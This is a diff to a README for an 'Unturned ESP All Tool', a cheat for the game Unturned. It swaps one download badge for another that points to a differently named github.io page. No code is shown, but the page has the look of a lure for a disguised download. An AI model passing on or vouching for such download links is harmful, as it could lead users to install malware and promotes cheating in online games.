@@ -4,11 +4,7 @@
 
 <h1 align="center"><strong>🕵️ UNTURNED ESP ALL TOOL – INSTALLATION & USAGE GUIDE</strong></h1>
 
-<p align="center">
-  <a href="https://unturnedtool1forpc1esp.github.io/.github/" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-228B22?style=for-the-badge&logo=windows&logoColor=white" alt="Download Unturned ESP All Tool" width="190px" />
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://carolapidgeonaitml.github.io/.github/Unturned-ESP)
 
 <p align="center">
   <em>Enhance your awareness — setup and configure all ESP features safely in Unturned on Windows.</em>
